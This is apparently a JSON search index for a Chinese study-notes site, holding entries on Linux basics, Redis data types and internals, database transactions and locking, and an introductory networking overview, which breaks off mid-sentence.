[{"id":0,"href":"/keeplearning/docs/linux/linux1/","title":"Linux（一）","section":"Linux","content":" Linux（一） # 常用操作以及概念 # 快捷键 # Tab：命令和文件名补全； Ctrl+C：中断正在运行的程序； Ctrl+D：结束键盘输入（End Of File，EOF） 求助 # 1. \u0026ndash;help # 指令的基本用法与选项介绍。\n2. man # man 是 manual 的缩写，将指令的具体信息显示出来。\n当执行man date时，有 DATE(1) 出现，其中的数字代表指令的类型，常用的数字及其类型如下：\n代号 类型 1 用户在 shell 环境中可以操作的指令或者可执行文件 5 配置文件 8 系统管理员可以使用的管理指令 3. info # info 与 man 类似，但是 info 将文档分成一个个页面，每个页面可以跳转。\n4. doc # /usr/share/doc 存放着软件的一整套说明文件。\n关机 # 1. who # 在关机前需要先使用 who 命令查看有没有其它用户在线。\n2. sync # 为了加快对磁盘文件的读写速度，位于内存中的文件数据不会立即同步到磁盘，因此关机之前需要先进行 sync 同步操作。\n3. shutdown # ## shutdown [-krhc] 时间 [信息] -k ： 不会关机，只是发送警告信息，通知所有在线的用户 -r ： 将系统的服务停掉后就重新启动 -h ： 将系统的服务停掉后就立即关机 -c ： 取消已经在进行的 shutdown PATH # 可以在环境变量 PATH 中声明可执行文件的路径，路径之间用 : 分隔。\n/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/dmtsai/.local/bin:/home/dmtsai/bin sudo # sudo 允许一般用户使用 root 可执行的命令，不过只有在 /etc/sudoers 配置文件中添加的用户才能使用该指令。\n包管理工具 # RPM 和 DPKG 为最常见的两类软件包管理工具：\nRPM 全称为 Redhat Package Manager，最早由 Red Hat 公司制定实施，随后被 GNU 开源操作系统接受并成为许多 Linux 系统的既定软件标准。YUM 基于 RPM，具有依赖管理和软件升级功能。 与 RPM 竞争的是基于 Debian 操作系统的 DEB 软件包管理工具 DPKG，全称为 Debian Package，功能方面与 RPM 相似。 发行版 # Linux 发行版是 Linux 内核及各种应用软件的集成版本。\n基于的包管理工具 商业发行版 社区发行版 RPM Red Hat Fedora / CentOS DPKG Ubuntu Debian VIM 三个模式 # 一般指令模式（Command mode）：VIM 的默认模式，可以用于移动游标查看内容； 编辑模式（Insert mode）：按下i等按键之后进入，可以对文本进行编辑； 指令列模式（Bottom-line mode）：按下:按键之后进入，用于保存退出等操作。 在指令列模式下，有以下命令用于离开或者保存文件。\n命令 作用 :w 写入磁盘 :w! 当文件为只读时，强制写入磁盘。到底能不能写入，与用户对该文件的权限有关 :q 离开 :q! 强制离开不保存 :wq 写入磁盘后离开 :wq! 强制写入磁盘后离开 GNU # GNU 计划，译为革奴计划，它的目标是创建一套完全自由的操作系统，称为 GNU，其内容软件完全以 GPL 方式发布。其中 GPL 全称为 GNU 通用公共许可协议（GNU General Public License），包含了以下内容：\n以任何目的运行此程序的自由； 再复制的自由； 改进此程序，并公开发布改进的自由。 开源协议 # Choose an open source license(opens new window) 如何选择开源许可证？ 磁盘 # 磁盘接口 # 1. IDE # IDE（ATA）全称 Advanced Technology Attachment，接口速度最大为 133MB/s，因为并口线的抗干扰性太差，且排线占用空间较大，不利电脑内部散热，已逐渐被 SATA 所取代。\n2. SATA # SATA 全称 Serial ATA，也就是使用串口的 ATA 接口，抗干扰性强，且对数据线的长度要求比 ATA 低很多，支持热插拔等功能。SATA-II 的接口速度为 300MB/s，而 SATA-III 标准可达到 600MB/s 的传输速度。SATA 的数据线也比 ATA 的细得多，有利于机箱内的空气流通，整理线材也比较方便。\n3. SCSI # SCSI 全称是 Small Computer System Interface（小型机系统接口），SCSI 硬盘广为工作站以及个人电脑以及服务器所使用，因此会使用较为先进的技术，如碟片转速 15000rpm 的高转速，且传输时 CPU 占用率较低，但是单价也比相同容量的 ATA 及 SATA 硬盘更加昂贵。\n磁盘的文件名 # Linux 中每个硬件都被当做一个文件，包括磁盘。磁盘以磁盘接口类型进行命名，常见磁盘的文件名如下：\nIDE 磁盘：/dev/hd[a-d] SATA/SCSI/SAS 磁盘：/dev/sd[a-p] 其中文件名后面的序号的确定与系统检测到磁盘的顺序有关，而与磁盘所插入的插槽位置无关。\n分区 # 分区表 # 磁盘分区表主要有两种格式，一种是限制较多的 MBR 分区表，一种是较新且限制较少的 GPT 分区表。\n1. MBR # MBR 中，第一个扇区最重要，里面有主要开机记录（Master boot record, MBR）及分区表（partition table），其中主要开机记录占 446 bytes，分区表占 64 bytes。\n分区表只有 64 bytes，最多只能存储 4 个分区，这 4 个分区为主分区（Primary）和扩展分区（Extended）。其中扩展分区只有一个，它使用其它扇区来记录额外的分区表，因此通过扩展分区可以分出更多分区，这些分区称为逻辑分区。\nLinux 也把分区当成文件，分区文件的命名方式为：磁盘文件名 + 编号，例如 /dev/sda1。注意，逻辑分区的编号从 5 开始。\n2. GPT # 扇区是磁盘的最小存储单位，旧磁盘的扇区大小通常为 512 bytes，而最新的磁盘支持 4 k。GPT 为了兼容所有磁盘，在定义扇区上使用逻辑区块地址（Logical Block Address, LBA），LBA 默认大小为 512 bytes。\nGPT 第 1 个区块记录了主要开机记录（MBR），紧接着是 33 个区块记录分区信息，并把最后的 33 个区块用于对分区信息进行备份。这 33 个区块第一个为 GPT 表头纪录，这个部份纪录了分区表本身的位置与大小和备份分区的位置，同时放置了分区表的校验码 (CRC32)，操作系统可以根据这个校验码来判断 GPT 是否正确。若有错误，可以使用备份分区进行恢复。\nGPT 没有扩展分区概念，都是主分区，每个 LBA 可以分 4 个分区，因此总共可以分 4 * 32 = 128 个分区。\nMBR 不支持 2.2 TB 以上的硬盘，GPT 则最多支持到 233 TB = 8 ZB。\n开机检测程序 # 1. BIOS # BIOS（Basic Input/Output System，基本输入输出系统），它是一个固件（嵌入在硬件中的软件），BIOS 程序存放在断电后内容不会丢失的只读内存中。\nBIOS 是开机的时候计算机执行的第一个程序，这个程序知道可以开机的磁盘，并读取磁盘第一个扇区的主要开机记录（MBR），由主要开机记录（MBR）执行其中的开机管理程序，这个开机管理程序会加载操作系统的核心文件。\n主要开机记录（MBR）中的开机管理程序提供以下功能：选单、载入核心文件以及转交其它开机管理程序。转交这个功能可以用来实现多重引导，只需要将另一个操作系统的开机管理程序安装在其它分区的启动扇区上，在启动开机管理程序时，就可以通过选单选择启动当前的操作系统或者转交给其它开机管理程序从而启动另一个操作系统。\n下图中，第一扇区的主要开机记录（MBR）中的开机管理程序提供了两个选单：M1、M2，M1 指向了 Windows 操作系统，而 M2 指向其它分区的启动扇区，里面包含了另外一个开机管理程序，提供了一个指向 Linux 的选单。\n安装多重引导，最好先安装 Windows 再安装 Linux。因为安装 Windows 时会覆盖掉主要开机记录（MBR），而 Linux 可以选择将开机管理程序安装在主要开机记录（MBR）或者其它分区的启动扇区，并且可以设置开机管理程序的选单。\n2. UEFI # BIOS 不可以读取 GPT 分区表，而 UEFI 可以。\n文件系统 # 分区与文件系统 # 对分区进行格式化是为了在分区上建立文件系统。一个分区通常只能格式化为一个文件系统，但是磁盘阵列等技术可以将一个分区格式化为多个文件系统。\n组成 # 最主要的几个组成部分如下：\ninode：一个文件占用一个 inode，记录文件的属性，同时记录此文件的内容所在的 block 编号； block：记录文件的内容，文件太大时，会占用多个 block。 除此之外还包括：\nsuperblock：记录文件系统的整体信息，包括 inode 和 block 的总量、使用量、剩余量，以及文件系统的格式与相关信息等； block bitmap：记录 block 是否被使用的位图。 文件读取 # 对于 Ext2 文件系统，当要读取一个文件的内容时，先在 inode 中查找文件内容所在的所有 block，然后把所有 block 的内容读出来。\n而对于 FAT 文件系统，它没有 inode，每个 block 中存储着下一个 block 的编号。\n磁盘碎片 # 指一个文件内容所在的 block 过于分散，导致磁盘磁头移动距离过大，从而降低磁盘读写性能。\nblock # 在 Ext2 文件系统中所支持的 block 大小有 1K，2K 及 4K 三种，不同的大小限制了单个文件和文件系统的最大大小。\n大小 1KB 2KB 4KB 最大单一文件 16GB 256GB 2TB 最大文件系统 2TB 8TB 16TB 一个 block 只能被一个文件所使用，未使用的部分直接浪费了。因此如果需要存储大量的小文件，那么最好选用比较小的 block。\ninode # inode 具体包含以下信息：\n权限 (read/write/excute)； 拥有者与群组 (owner/group)； 容量； 建立或状态改变的时间 (ctime)； 最近读取时间 (atime)； 最近修改时间 (mtime)； 定义文件特性的旗标 (flag)，如 SetUID\u0026hellip;； 该文件真正内容的指向 (pointer)。 inode 具有以下特点：\n每个 inode 大小均固定为 128 bytes (新的 ext4 与 xfs 可设定到 256 bytes)； 每个文件都仅会占用一个 inode。 inode 中记录了文件内容所在的 block 编号，但是每个 block 非常小，一个大文件随便都需要几十万的 block。而一个 inode 大小有限，无法直接引用这么多 block 编号。因此引入了间接、双间接、三间接引用。间接引用让 inode 记录的引用 block 块记录引用信息。\n目录 # 建立一个目录时，会分配一个 inode 与至少一个 block。block 记录的内容是目录下所有文件的 inode 编号以及文件名。\n可以看到文件的 inode 本身不记录文件名，文件名记录在目录中，因此新增文件、删除文件、更改文件名这些操作与目录的写权限有关。\n日志 # 如果突然断电，那么文件系统会发生错误，例如断电前只修改了 block bitmap，而还没有将数据真正写入 block 中。\next3/ext4 文件系统引入了日志功能，可以利用日志来修复文件系统。\n挂载 # 挂载利用目录作为文件系统的进入点，也就是说，进入目录之后就可以读取文件系统的数据。\n目录配置 # 为了使不同 Linux 发行版本的目录结构保持一致性，Filesystem Hierarchy Standard (FHS) 规定了 Linux 的目录结构。最基础的三个目录如下：\n/ (root, 根目录) /usr (unix software resource)：所有系统默认软件都会安装到这个目录； /var (variable)：存放系统或程序运行过程中的数据文件。 "},{"id":1,"href":"/keeplearning/docs/redis/redis1/","title":"Redis（一）","section":"Redis","content":" Redis（一） # 一、概述 # Redis 是速度非常快的非关系型（NoSQL）内存键值数据库，可以存储键和五种不同类型的值之间的映射。\n键的类型只能为字符串，值支持五种数据类型：字符串、列表、集合、散列表、有序集合。\nRedis 支持很多特性，例如将内存中的数据持久化到硬盘中，使用复制来扩展读性能，使用分片来扩展写性能。\n二、数据类型 # 数据类型 可以存储的值 操作 STRING 字符串、整数或者浮点数 对整个字符串或者字符串的其中一部分执行操作\n对整数和浮点数执行自增或者自减操作 LIST 列表 从两端压入或者弹出元素 对单个或者多个元素进行修剪，\n只保留一个范围内的元素 SET 无序集合 添加、获取、移除单个元素\n检查一个元素是否存在于集合中\n计算交集、并集、差集\n从集合里面随机获取元素 HASH 包含键值对的无序散列表 添加、获取、移除单个键值对 获取所有键值对\n检查某个键是否存在 ZSET 有序集合 添加、获取、删除元素 根据分值范围或者成员来获取元素\n计算一个键的排名 STRING # \u0026gt; set hello world OK \u0026gt; get hello \u0026#34;world\u0026#34; \u0026gt; del hello (integer) 1 \u0026gt; get hello (nil) LIST # \u0026gt; rpush list-key item (integer) 1 \u0026gt; rpush list-key item2 (integer) 2 \u0026gt; rpush list-key item (integer) 3 \u0026gt; lrange list-key 0 -1 1) \u0026#34;item\u0026#34; 2) \u0026#34;item2\u0026#34; 3) \u0026#34;item\u0026#34; \u0026gt; lindex list-key 1 \u0026#34;item2\u0026#34; \u0026gt; lpop list-key \u0026#34;item\u0026#34; \u0026gt; lrange list-key 0 -1 1) \u0026#34;item2\u0026#34; 2) \u0026#34;item\u0026#34; SET # \u0026gt; sadd set-key item (integer) 1 \u0026gt; sadd set-key item2 (integer) 1 \u0026gt; sadd set-key item3 (integer) 1 \u0026gt; sadd set-key item (integer) 0 \u0026gt; smembers set-key 1) \u0026#34;item\u0026#34; 2) \u0026#34;item2\u0026#34; 3) \u0026#34;item3\u0026#34; \u0026gt; sismember set-key item4 (integer) 0 \u0026gt; sismember set-key item (integer) 1 \u0026gt; srem set-key item2 (integer) 1 \u0026gt; srem set-key item2 (integer) 0 \u0026gt; smembers set-key 1) \u0026#34;item\u0026#34; 2) \u0026#34;item3\u0026#34; HASH # \u0026gt; hset hash-key sub-key1 value1 (integer) 1 \u0026gt; hset hash-key sub-key2 value2 (integer) 1 \u0026gt; hset hash-key sub-key1 value1 (integer) 0 \u0026gt; hgetall hash-key 1) \u0026#34;sub-key1\u0026#34; 2) \u0026#34;value1\u0026#34; 3) \u0026#34;sub-key2\u0026#34; 4) \u0026#34;value2\u0026#34; \u0026gt; hdel hash-key sub-key2 (integer) 1 \u0026gt; hdel hash-key sub-key2 (integer) 0 \u0026gt; hget hash-key sub-key1 \u0026#34;value1\u0026#34; \u0026gt; hgetall hash-key 1) \u0026#34;sub-key1\u0026#34; 2) \u0026#34;value1\u0026#34; ZSET # \u0026gt; zadd zset-key 728 member1 (integer) 1 \u0026gt; zadd zset-key 982 member0 (integer) 1 \u0026gt; zadd zset-key 982 member0 (integer) 0 \u0026gt; zrange zset-key 0 -1 withscores 1) \u0026#34;member1\u0026#34; 2) \u0026#34;728\u0026#34; 3) \u0026#34;member0\u0026#34; 4) \u0026#34;982\u0026#34; \u0026gt; zrangebyscore zset-key 0 800 withscores 1) \u0026#34;member1\u0026#34; 2) \u0026#34;728\u0026#34; \u0026gt; zrem zset-key member1 (integer) 1 \u0026gt; zrem zset-key member1 (integer) 0 \u0026gt; zrange zset-key 0 -1 withscores 1) \u0026#34;member0\u0026#34; 2) \u0026#34;982\u0026#34; 三、数据结构 # 字典 # dictht 是一个散列表结构，使用拉链法解决哈希冲突。\n/* This is our hash table structure. Every dictionary has two of this as we * implement incremental rehashing, for the old to the new table. */ typedef struct dictht { dictEntry **table; unsigned long size; unsigned long sizemask; unsigned long used; } dictht; typedef struct dictEntry { void *key; union { void *val; uint64_t u64; int64_t s64; double d; } v; struct dictEntry *next; } dictEntry; Redis 的字典 dict 中包含两个哈希表 dictht，这是为了方便进行 rehash 操作。在扩容时，将其中一个 dictht 上的键值对 rehash 到另一个 dictht 上面，完成之后释放空间并交换两个 dictht 的角色。\ntypedef struct dict { dictType *type; void *privdata; dictht ht[2]; long rehashidx; /* rehashing not in progress if rehashidx == -1 */ unsigned long iterators; /* number of iterators currently running */ } dict; rehash 操作不是一次性完成，而是采用渐进方式，这是为了避免一次性执行过多的 rehash 操作给服务器带来过大的负担。\n渐进式 rehash 通过记录 dict 的 rehashidx 完成，它从 0 开始，然后每执行一次 rehash 都会递增。例如在一次 rehash 中，要把 dict[0] rehash 到 dict[1]，这一次会把 dict[0] 上 table[rehashidx] 的键值对 rehash 到 dict[1] 上，dict[0] 的 table[rehashidx] 指向 null，并令 rehashidx++。\n在 rehash 期间，每次对字典执行添加、删除、查找或者更新操作时，都会执行一次渐进式 rehash。\n采用渐进式 rehash 会导致字典中的数据分散在两个 dictht 上，因此对字典的查找操作也需要到对应的 dictht 去执行。\n/* Performs N steps of incremental rehashing. Returns 1 if there are still * keys to move from the old to the new hash table, otherwise 0 is returned. * * Note that a rehashing step consists in moving a bucket (that may have more * than one key as we use chaining) from the old to the new hash table, however * since part of the hash table may be composed of empty spaces, it is not * guaranteed that this function will rehash even a single bucket, since it * will visit at max N*10 empty buckets in total, otherwise the amount of * work it does would be unbound and the function may block for a long time. */ int dictRehash(dict *d, int n) { int empty_visits = n * 10; /* Max number of empty buckets to visit. */ if (!dictIsRehashing(d)) return 0; while (n-- \u0026amp;\u0026amp; d-\u0026gt;ht[0].used != 0) { dictEntry *de, *nextde; /* Note that rehashidx can\u0026#39;t overflow as we are sure there are more * elements because ht[0].used != 0 */ assert(d-\u0026gt;ht[0].size \u0026gt; (unsigned long) d-\u0026gt;rehashidx); while (d-\u0026gt;ht[0].table[d-\u0026gt;rehashidx] == NULL) { d-\u0026gt;rehashidx++; if (--empty_visits == 0) return 1; } de = d-\u0026gt;ht[0].table[d-\u0026gt;rehashidx]; /* Move all the keys in this bucket from the old to the new hash HT */ while (de) { uint64_t h; nextde = de-\u0026gt;next; /* Get the index in the new hash table */ h = dictHashKey(d, de-\u0026gt;key) \u0026amp; d-\u0026gt;ht[1].sizemask; de-\u0026gt;next = d-\u0026gt;ht[1].table[h]; d-\u0026gt;ht[1].table[h] = de; d-\u0026gt;ht[0].used--; d-\u0026gt;ht[1].used++; de = nextde; } d-\u0026gt;ht[0].table[d-\u0026gt;rehashidx] = NULL; d-\u0026gt;rehashidx++; } /* Check if we already rehashed the whole table... */ if (d-\u0026gt;ht[0].used == 0) { zfree(d-\u0026gt;ht[0].table); d-\u0026gt;ht[0] = d-\u0026gt;ht[1]; _dictReset(\u0026amp;d-\u0026gt;ht[1]); d-\u0026gt;rehashidx = -1; return 0; } /* More to rehash... */ return 1; } 跳跃表 # 是有序集合的底层实现之一。\n跳跃表是基于多指针有序链表实现的，可以看成多个有序链表。\n在查找时，从上层指针开始查找，找到对应的区间之后再到下一层去查找。下图演示了查找 22 的过程。\n与红黑树等平衡树相比，跳跃表具有以下优点：\n插入速度非常快速，因为不需要进行旋转等操作来维护平衡性； 更容易实现； 支持无锁操作。 四、使用场景 # 计数器 # 可以对 String 进行自增自减运算，从而实现计数器功能。\nRedis 这种内存型数据库的读写性能非常高，很适合存储频繁读写的计数量。\n缓存 # 将热点数据放到内存中，设置内存的最大使用量以及淘汰策略来保证缓存的命中率。\n查找表 # 例如 DNS 记录就很适合使用 Redis 进行存储。\n查找表和缓存类似，也是利用了 Redis 快速的查找特性。但是查找表的内容不能失效，而缓存的内容可以失效，因为缓存不作为可靠的数据来源。\n消息队列 # List 是一个双向链表，可以通过 lpush 和 rpop 写入和读取消息\n不过最好使用 Kafka、RabbitMQ 等消息中间件。\n会话缓存 # 可以使用 Redis 来统一存储多台应用服务器的会话信息。\n当应用服务器不再存储用户的会话信息，也就不再具有状态，一个用户可以请求任意一个应用服务器，从而更容易实现高可用性以及可伸缩性。\n分布式锁实现 # 在分布式场景下，无法使用单机环境下的锁来对多个节点上的进程进行同步。\n可以使用 Redis 自带的 SETNX 命令实现分布式锁，除此之外，还可以使用官方提供的 RedLock 分布式锁实现。\n其它 # Set 可以实现交集、并集等操作，从而实现共同好友等功能。\nZSet 可以实现有序性操作，从而实现排行榜等功能。\n五、Redis 与 Memcached # 两者都是非关系型内存键值数据库，主要有以下不同：\n数据类型 # Memcached 仅支持字符串类型，而 Redis 支持五种不同的数据类型，可以更灵活地解决问题。\n数据持久化 # Redis 支持两种持久化策略：RDB 快照和 AOF 日志，而 Memcached 不支持持久化。\n分布式 # Memcached 不支持分布式，只能通过在客户端使用一致性哈希来实现分布式存储，这种方式在存储和查询时都需要先在客户端计算一次数据所在的节点。\nRedis Cluster 实现了分布式的支持。\n内存管理机制 # 在 Redis 中，并不是所有数据都一直存储在内存中，可以将一些很久没用的 value 交换到磁盘，而 Memcached 的数据则会一直在内存中。\nMemcached 将内存分割成特定长度的块来存储数据，以完全解决内存碎片的问题。但是这种方式会使得内存的利用率不高，例如块的大小为 128 bytes，只存储 100 bytes 的数据，那么剩下的 28 bytes 就浪费掉了。\n六、键的过期时间 # Redis 可以为每个键设置过期时间，当键过期时，会自动删除该键。\n对于散列表这种容器，只能为整个键设置过期时间（整个散列表），而不能为键里面的单个元素设置过期时间。\n七、数据淘汰策略 # 可以设置内存最大使用量，当内存使用量超出时，会施行数据淘汰策略。\nRedis 具体有 6 种淘汰策略：\n策略 描述 volatile-lru 从已设置过期时间的数据集中挑选最近最少使用的数据淘汰 volatile-ttl 从已设置过期时间的数据集中挑选将要过期的数据淘汰 volatile-random 从已设置过期时间的数据集中任意选择数据淘汰 allkeys-lru 从所有数据集中挑选最近最少使用的数据淘汰 allkeys-random 从所有数据集中任意选择数据进行淘汰 noeviction 禁止驱逐数据 作为内存数据库，出于对性能和内存消耗的考虑，Redis 的淘汰算法实际实现上并非针对所有 key，而是抽样一小部分并且从中选出被淘汰的 key。\n使用 Redis 缓存数据时，为了提高缓存命中率，需要保证缓存数据都是热点数据。可以将内存最大使用量设置为热点数据占用的内存量，然后启用 allkeys-lru 淘汰策略，将最近最少使用的数据淘汰。\nRedis 4.0 引入了 volatile-lfu 和 allkeys-lfu 淘汰策略，LFU 策略通过统计访问频率，将访问频率最少的键值对淘汰。\n"},{"id":2,"href":"/keeplearning/docs/mysql/dbs-theory/","title":"数据库系统原理（一）","section":"MySQL","content":" 数据库系统原理（一） # 一、事务 # 概念 # 事务指的是满足 ACID 特性的一组操作，可以通过 Commit 提交一个事务，也可以使用 Rollback 进行回滚。\nACID # 1. 原子性（Atomicity） # 事务被视为不可分割的最小单元，事务的所有操作要么全部提交成功，要么全部失败回滚。\n回滚可以用回滚日志（Undo Log）来实现，回滚日志记录着事务所执行的修改操作，在回滚时反向执行这些修改操作即可。\n2. 一致性（Consistency） # 数据库在事务执行前后都保持一致性状态。在一致性状态下，所有事务对同一个数据的读取结果都是相同的。\n3. 隔离性（Isolation） # 一个事务所做的修改在最终提交以前，对其它事务是不可见的。\n4. 持久性（Durability） # 一旦事务提交，则其所做的修改将会永远保存到数据库中。即使系统发生崩溃，事务执行的结果也不能丢失。\n系统发生崩溃可以用重做日志（Redo Log）进行恢复，从而实现持久性。与回滚日志记录数据的逻辑修改不同，重做日志记录的是数据页的物理修改。\n事务的 ACID 特性概念简单，但不是很好理解，主要是因为这几个特性不是一种平级关系：\n只有满足一致性，事务的执行结果才是正确的。 在无并发的情况下，事务串行执行，隔离性一定能够满足。此时只要能满足原子性，就一定能满足一致性。 在并发的情况下，多个事务并行执行，事务不仅要满足原子性，还需要满足隔离性，才能满足一致性。 事务满足持久化是为了能应对系统崩溃的情况。 AUTOCOMMIT # MySQL 默认采用自动提交模式。也就是说，如果不显式使用START TRANSACTION语句来开始一个事务，那么每个查询操作都会被当做一个事务并自动提交。\n二、并发一致性问题 # 在并发环境下，事务的隔离性很难保证，因此会出现很多并发一致性问题。\n丢失修改 # 丢失修改指一个事务的更新操作被另外一个事务的更新操作替换。一般在现实生活中常会遇到，例如：T1 和 T2 两个事务都对一个数据进行修改，T1 先修改并提交生效，T2 随后修改，T2 的修改覆盖了 T1 的修改。\n读脏数据 # 读脏数据指在不同的事务下，当前事务可以读到另外事务未提交的数据。例如：T1 修改一个数据但未提交，T2 随后读取这个数据。如果 T1 撤销了这次修改，那么 T2 读取的数据是脏数据。\n不可重复读 # 不可重复读指在一个事务内多次读取同一数据集合。在这一事务还未结束前，另一事务也访问了该同一数据集合并做了修改，由于第二个事务的修改，第一次事务的两次读取的数据可能不一致。例如：T2 读取一个数据，T1 对该数据做了修改。如果 T2 再次读取这个数据，此时读取的结果和第一次读取的结果不同。\n幻影读 # 幻读本质上也属于不可重复读的情况，T1 读取某个范围的数据，T2 在这个范围内插入新的数据，T1 再次读取这个范围的数据，此时读取的结果和和第一次读取的结果不同。\n产生并发不一致性问题的主要原因是破坏了事务的隔离性，解决方法是通过并发控制来保证隔离性。并发控制可以通过封锁来实现，但是封锁操作需要用户自己控制，相当复杂。数据库管理系统提供了事务的隔离级别，让用户以一种更轻松的方式处理并发一致性问题。\n三、封锁 # 封锁粒度 # MySQL 中提供了两种封锁粒度：行级锁以及表级锁。\n应该尽量只锁定需要修改的那部分数据，而不是所有的资源。锁定的数据量越少，发生锁争用的可能就越小，系统的并发程度就越高。\n但是加锁需要消耗资源，锁的各种操作（包括获取锁、释放锁、以及检查锁状态）都会增加系统开销。因此封锁粒度越小，系统开销就越大。\n在选择封锁粒度时，需要在锁开销和并发程度之间做一个权衡。\n封锁类型 # 1. 读写锁 # 互斥锁（Exclusive），简写为 X 锁，又称写锁。 共享锁（Shared），简写为 S 锁，又称读锁。 有以下两个规定：\n一个事务对数据对象 A 加了 X 锁，就可以对 A 进行读取和更新。加锁期间其它事务不能对 A 加任何锁。 一个事务对数据对象 A 加了 S 锁，可以对 A 进行读取操作，但是不能进行更新操作。加锁期间其它事务能对 A 加 S 锁，但是不能加 X 锁。 锁的兼容关系如下：\n2. 意向锁 # 使用意向锁（Intention Locks）可以更容易地支持多粒度封锁。\n在存在行级锁和表级锁的情况下，事务 T 想要对表 A 加 X 锁，就需要先检测是否有其它事务对表 A 或者表 A 中的任意一行加了锁，那么就需要对表 A 的每一行都检测一次，这是非常耗时的。\n意向锁在原来的 X/S 锁之上引入了 IX/IS，IX/IS 都是表锁，用来表示一个事务想要在表中的某个数据行上加 X 锁或 S 锁。有以下两个规定：\n一个事务在获得某个数据行对象的 S 锁之前，必须先获得表的 IS 锁或者更强的锁； 一个事务在获得某个数据行对象的 X 锁之前，必须先获得表的 IX 锁。 通过引入意向锁，事务 T 想要对表 A 加 X 锁，只需要先检测是否有其它事务对表 A 加了 X/IX/S/IS 锁，如果加了就表示有其它事务正在使用这个表或者表中某一行的锁，因此事务 T 加 X 锁失败。\n各种锁的兼容关系如下：\n解释如下：\n任意 IS/IX 锁之间都是兼容的，因为它们只表示想要对表加锁，而不是真正加锁； 这里兼容关系针对的是表级锁，而表级的 IX 锁和行级的 X 锁兼容，两个事务可以对两个数据行加 X 锁。（事务 T1 想要对数据行 R1 加 X 锁，事务 T2 想要对同一个表的数据行 R2 加 X 锁，两个事务都需要对该表加 IX 锁，但是 IX 锁是兼容的，并且 IX 锁与行级的 X 锁也是兼容的，因此两个事务都能加锁成功，对同一个表中的两个数据行做修改。） 封锁协议 # 1. 三级封锁协议 # 一级封锁协议\n事务 T 要修改数据 A 时必须加 X 锁，直到 T 结束才释放锁。\n可以解决丢失修改问题，因为不能同时有两个事务对同一个数据进行修改，那么事务的修改就不会被覆盖。\n二级封锁协议\n在一级的基础上，要求读取数据 A 时必须加 S 锁，读取完马上释放 S 锁。\n可以解决读脏数据问题，因为如果一个事务在对数据 A 进行修改，根据 1 级封锁协议，会加 X 锁，那么就不能再加 S 锁了，也就是不会读入数据。\n三级封锁协议\n在二级的基础上，要求读取数据 A 时必须加 S 锁，直到事务结束了才能释放 S 锁。\n可以解决不可重复读的问题，因为读 A 时，其它事务不能对 A 加 X 锁，从而避免了在读的期间数据发生改变。\n2. 两段锁协议 # 加锁和解锁分为两个阶段进行。\n可串行化调度是指，通过并发控制，使得并发执行的事务结果与某个串行执行的事务结果相同。串行执行的事务互不干扰，不会出现并发一致性问题。\n事务遵循两段锁协议是保证可串行化调度的充分条件。例如以下操作满足两段锁协议，它是可串行化调度。\nlock-x(A)...lock-s(B)...lock-s(C)...unlock(A)...unlock(C)...unlock(B) 但不是必要条件，例如以下操作不满足两段锁协议，但它还是可串行化调度。\nlock-x(A)...unlock(A)...lock-s(B)...unlock(B)...lock-s(C)...unlock(C) MySQL 隐式与显式锁定 # MySQL 的 InnoDB 存储引擎采用两段锁协议，会根据隔离级别在需要的时候自动加锁，并且所有的锁都是在同一时刻被释放，这被称为隐式锁定。\nInnoDB 也可以使用特定的语句进行显示锁定：\nSELECT ... LOCK In SHARE MODE; SELECT ... FOR UPDATE; 四、隔离级别 # 未提交读（READ UNCOMMITTED） # 事务中的修改，即使没有提交，对其它事务也是可见的。\n提交读（READ COMMITTED） # 一个事务只能读取已经提交的事务所做的修改。换句话说，一个事务所做的修改在提交之前对其它事务是不可见的。\n可重复读（REPEATABLE READ） # 保证在同一个事务中多次读取同一数据的结果是一样的。\n可串行化（SERIALIZABLE） # 强制事务串行执行，这样多个事务互不干扰，不会出现并发一致性问题。\n该隔离级别需要加锁实现，因为要使用加锁机制保证同一时间只有一个事务执行，也就是保证事务串行执行。\n"},{"id":3,"href":"/keeplearning/docs/network/overview/","title":"网络概述","section":"网络","content":" 网络概述 # 网络把主机连接起来，而互连网（internet）是把多种不同的网络连接起来，因此互连网是网络的网络。而互联网（Internet）是全球范围的互连网。\nISP # 互联网服务提供商 ISP（Internet Service Provider） 可以从互联网管理机构获得许多 IP 地址，同时拥有通信线路以及路由器等联网设备，个人或机构向 ISP 缴纳一定的费用就可以接入互联网。\n目前的互联网是一种多层次 ISP 结构，ISP 根据覆盖面积的大小分为第一层 ISP、区域 ISP 和接入 ISP。互联网交换点 IXP（Internet Exchange Point） 允许两个 ISP 直接相连而不用经过第三个 ISP。\n主机之间的通信方式 # 客户-服务器（C/S）：客户是服务的请求方，服务器是服务的提供方。 对等（P2P）：不区分客户和服务器。 电路交换与分组交换 # 电路交换 # 电路交换用于电话通信系统，两个用户要通信之前需要建立一条专用的物理链路，并且在整个通信过程中始终占用该链路。由于通信的过程中不可能一直在使用传输线路，因此电路交换对线路的利用率很低，往往不到 10%。\n分组交换 # 每个分组都有首部和尾部，包含了源地址和目的地址等控制信息，在同一个传输线路上同时传输多个分组互相不会影响，因此在同一条传输线路上允许同时传输多个分组，也就是说分组交换不需要占用传输线路。\n在一个邮局通信系统中，邮局收到一份邮件之后，先存储下来，然后把相同目的地的邮件一起转发到下一个目的地，这个过程就是存储转发过程，分组交换也使用了存储转发过程。\n时延 # 总时延 = 排队时延 + 处理时延 + 传输时延 + 传播时延\n排队时延 # 分组在路由器的输入队列和输出队列中排队等待的时间，取决于网络当前的通信量。\n处理时延 # 主机或路由器收到分组时进行处理所需要的时间，例如分析首部、从分组中提取数据、进行差错检验或查找适当的路由等。\n传输时延 # 主机或路由器传输数据帧所需要的时间。\n其中l表示数据帧的长度，v表示传输速率。\n传播时延 # 电磁波在信道中传播所需要花费的时间，电磁波传播的速度接近光速。\n其中l表示信道长度，v表示电磁波在信道上的传播速度。\n计算机网络体系结构 # 五层协议 # 应用层 ：为特定应用程序提供数据传输服务，例如 HTTP、DNS 等协议。数据单位为报文。\n传输层 ：为进程提供通用数据传输服务。由于应用层协议很多，定义通用的传输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为报文段；用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。TCP 主要提供完整性服务，UDP 主要提供及时性服务。\n网络层 ：为主机提供数据传输服务。而传输层协议是为主机中的进程提供数据传输服务。网络层把传输层传递下来的报文段或者用户数据报封装成分组。\n数据链路层 